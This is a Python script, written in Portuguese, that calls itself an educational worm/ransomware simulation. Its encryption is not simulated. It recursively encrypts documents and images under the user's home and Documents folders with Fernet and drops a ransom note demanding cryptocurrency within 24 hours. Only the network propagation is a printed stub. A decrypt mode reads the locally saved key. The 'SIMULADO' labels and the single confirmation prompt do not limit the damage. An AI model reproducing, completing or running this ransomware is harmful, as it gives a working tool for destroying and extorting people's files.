import os
import sys
import time
import random
import socket
import threading
from cryptography.fernet import Fernet
import base64

DIRETORIOS_ALVO = [os.path.expanduser("~"), os.path.join(os.path.expanduser("~"), "Documents")]
EXTENSOES_ALVO = ['.txt', '.jpg', '.png', '.doc', '.docx', '.pdf']
ARQUIVO_CHAVE = "chave_worm.key"
ARQUIVO_INSTRUCOES = "LEIA_PARA_RECUPERAR.txt"
EMAIL_CONTATO = "contato_falso@email.com"
VALOR_RESGATE = "R$ 750,00 em criptomoeda"
TEMPO_LIMITE_HORAS = 24
PROBABILIDADE_COPIAR = 0.3
HOSTS_CONHECIDOS = ["localhost"]
PORTA_COMUNICACAO = 12345

def gerar_chave():
    chave = Fernet.generate_key()
    return chave

def salvar_chave_local(chave):
    try:
        with open(ARQUIVO_CHAVE, "wb") as arquivo_chave:
            arquivo_chave.write(chave)
        print(f"[+] Chave salva localmente: {ARQUIVO_CHAVE}")
        return True
    except Exception as e:
        print(f"[-] Erro ao salvar a chave localmente: {e}")
        return False

def carregar_chave_local():
    try:
        with open(ARQUIVO_CHAVE, "rb") as arquivo_chave:
            chave = arquivo_chave.read()
        print(f"[+] Chave carregada localmente: {ARQUIVO_CHAVE}")
        return chave
    except FileNotFoundError:
        print("[-] Arquivo de chave local não encontrado.")
        return None
    except Exception as e:
        print(f"[-] Erro ao carregar a chave local: {e}")
        return None

def criptografar_arquivo(caminho_arquivo, chave):
    try:
        with open(caminho_arquivo, "rb") as arquivo:
            dados = arquivo.read()

        f = Fernet(chave)
        dados_criptografados = f.encrypt(dados)

        with open(caminho_arquivo, "wb") as arquivo_criptografado:
            arquivo_criptografado.write(dados_criptografados)

        print(f"[+] Arquivo criptografado: {caminho_arquivo}")
        return True
    except Exception as e:
        print(f"[-] Erro ao criptografar {caminho_arquivo}: {e}")
        return False

def descriptografar_arquivo(caminho_arquivo, chave):
    try:
        with open(caminho_arquivo, "rb") as arquivo_criptografado:
            dados_criptografados = arquivo_criptografado.read()

        f = Fernet(chave)
        dados_descriptografados = f.decrypt(dados_criptografados)

        with open(caminho_arquivo, "wb") as arquivo_original:
            arquivo_original.write(dados_descriptografados)

        print(f"[+] Arquivo descriptografado: {caminho_arquivo}")
        return True
    except Exception as e:
        print(f"[-] Erro ao descriptografar {caminho_arquivo}: {e}")
        return False

def buscar_arquivos(diretorios, extensoes):
    arquivos_encontrados = []
    for diretorio in diretorios:
        for raiz, _, arquivos in os.walk(diretorio):
            for arquivo in arquivos:
                if any(arquivo.endswith(ext) for ext in extensoes):
                    caminho_completo = os.path.join(raiz, arquivo)
                    arquivos_encontrados.append(caminho_completo)
    return arquivos_encontrados

def criar_arquivo_instrucoes(chave_base64):
    mensagem = f"""
SEUS ARQUIVOS FORAM CRIPTOGRAFADOS E ESTE SISTEMA FOI INFECTADO!

Todos os seus documentos, fotos, vídeos e outros arquivos importantes foram criptografados.
Este sistema também foi infectado com um worm que pode se espalhar para outras máquinas na rede.
Você não poderá acessar seus arquivos novamente e outros sistemas podem ser comprometidos sem a chave de descriptografia.

Para recuperar seus arquivos e evitar a propagação, você precisa pagar um resgate de:
{VALOR_RESGATE}

Entre em contato conosco por e-mail para obter instruções de pagamento:
{EMAIL_CONTATO}

Envie a seguinte chave de identificação no seu e-mail:
{chave_base64.decode()}

AVISO:
- Não tente descriptografar seus arquivos ou remover este programa por conta própria. Isso pode danificá-los permanentemente e alertar outros sistemas.
- Se você não pagar dentro de {TEMPO_LIMITE_HORAS} horas, a chave de descriptografia será destruída e a infecção pode se tornar mais agressiva.

---
Este foi um ataque de worm/ransomware SIMULADO para fins educacionais.
Em um ataque real, a propagação e a criptografia seriam muito mais complexas e perigosas.
"""
    try:
        with open(ARQUIVO_INSTRUCOES, "w") as arquivo_instrucoes:
            arquivo_instrucoes.write(mensagem)
        print(f"[+] Arquivo de instruções criado: {ARQUIVO_INSTRUCOES}")
        return True
    except Exception as e:
        print(f"[-] Erro ao criar o arquivo de instruções: {e}")
        return False

def propagar():
    if random.random() < PROBABILIDADE_COPIAR:
        host_alvo = random.choice(HOSTS_CONHECIDOS)
        if host_alvo != "localhost":
            print(f"[+] Tentando se copiar para: {host_alvo}:{PORTA_COMUNICACAO} (SIMULADO)")
        else:
            print("[+] Não tentando se copiar para localhost.")
    else:
        print("[+] Não é o momento de se propagar (SIMULADO).")

def main_infectar():
    chave = gerar_chave()
    if salvar_chave_local(chave):
        chave_base64 = base64.urlsafe_b64encode(chave)
        arquivos_alvo = buscar_arquivos(DIRETORIOS_ALVO, EXTENSOES_ALVO)
        print(f"[+] {len(arquivos_alvo)} arquivos alvo encontrados.")
        for arquivo in arquivos_alvo:
            criptografar_arquivo(arquivo, chave)
        criar_arquivo_instrucoes(chave_base64)
        print("[+] Processo de criptografia simulado concluído.")
        propagar()
        print("[+] Rotina de propagação iniciada (SIMULADO).")

def main_desinfectar():
    chave = carregar_chave_local()
    if chave:
        arquivos_criptografados = buscar_arquivos(DIRETORIOS_ALVO, EXTENSOES_ALVO)
        print(f"[+] Tentando descriptografar {len(arquivos_criptografados)} arquivos.")
        for arquivo in arquivos_criptografados:
            descriptografar_arquivo(arquivo, chave)
        print("[+] Processo de descriptografia simulado concluído.")
        print("[+] Remoção do worm (simulado) - nenhuma ação adicional necessária nesta simulação.")
    else:
        print("[-] Chave de descriptografia local não encontrada. A desinfecção não pode ser realizada.")
        print("[-] Seus arquivos permanecem criptografados.")

if __name__ == "__main__":
    opcao = input("Simular INFECÇÃO (1) ou DESINFECÇÃO (2)? ")
    if opcao == "1":
        print("\n[!] INICIANDO SIMULAÇÃO DE INFECÇÃO (WORM/RANSOMWARE). ARQUIVOS NAS PASTAS ALVO SERÃO CRIPTOGRAFADOS (SIMULADO)!")
        confirmacao = input("Tem certeza que deseja SIMULAR a infecção? (s/n): ")
        if confirmacao.lower() == 's':
            main_infectar()
        else:
            print("Operação de infecção simulada cancelada.")
    elif opcao == "2":
        print("\n[!] INICIANDO SIMULAÇÃO DE DESINFECÇÃO. Certifique-se de que o arquivo 'chave_worm.key' esteja presente.")
        main_desinfectar()
    else:
        print("Opção inválida.")

    print("\n[***] FIM DA SIMULAÇÃO. LEMBRE-SE: ESTE É APENAS UM EXEMPLO.")